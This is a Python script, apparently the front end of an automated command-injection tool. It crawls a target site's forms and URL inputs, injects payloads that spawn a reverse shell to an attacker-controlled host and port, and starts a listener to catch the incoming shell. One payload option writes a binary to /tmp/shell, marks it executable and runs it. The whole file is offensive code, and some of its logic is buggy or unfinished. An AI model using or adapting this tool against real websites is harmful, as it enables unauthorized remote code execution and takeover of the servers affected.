#!/usr/bin/python

import argparse

from payloads import Monkey, Generator

from server import ReverseListener

parser = argparse.ArgumentParser(description='Test')

def comma_separated(names):
    return names.split(',')

parser.add_argument('target_url', help='Target URL')
parser.add_argument('-lhost', '--lhost', help='Server the payload connects to', default='127.0.0.1')
parser.add_argument('-lport', '--lport', help='Port of the server the payload connects to', default='80')
parser.add_argument('-ptype', '--ptype', help='Payload type', default='shell')
parser.add_argument('-names', type=comma_separated, help="Comma-separated list of names to inject", default=[])
parser.add_argument('-v', '--verbose', action='store_true', help='Increase output verbosity')

args = parser.parse_args()

print(f"target_url: {args.target_url}")

if args.verbose:
    pass
    # TODO

if not args.target_url:
    print("Target URL required")
    exit(1)

if not "http" in args.target_url:
    print("No protocol specified")
    exit(1)

if not args.lhost:
    print("No -lhost specified")
    exit(1)

LHOST = args.lhost
LPORT = args.lport

has_shell = False

def on_recv(data):
    print("".join([d.decode() for d in data]))

def on_shell(addr):
    has_shell = True

monkey = Monkey(args.target_url)

generator = Generator(lhost=LHOST, lport=LPORT)

listener = ReverseListener(
    ip=LHOST, port=LPORT, recv_cb=on_recv, success_cb=on_shell, once=False)

listener.start()

if monkey.get_forms() is None and monkey.get_inputs() is None:
    print("Nowhere to inject")
    exit(1)

print(monkey.get_js_endpoints())
print(monkey.get_js_urls())

if args.ptype == 'shell':
    pl = generator.ir_shell()
elif args.ptype == 'bin':
    pl_bin = generator.ir_bin()
    pl = f'printf "{pl_bin}" > /tmp/shell && chmod +x /tmp/shell && /tmp/shell'
elif args.ptype == 'nc': # todo
    pass
elif args.ptype == 'custom': # todo
    pass

if monkey.get_forms():
    print("Injecting via forms")
    monkey.autoinject_forms(pl)

if monkey.get_inputs() and not has_shell:
    print("Injecting with names found in inputs")
    monkey.autoinject_urls(pl)

if monkey.get_inputs() and not has_shell and (len(args.names) > 0):
    print("Injecting via endpoints with custom names")
    shell = generator.ir_shell()
    monkey.autoinject_urls()


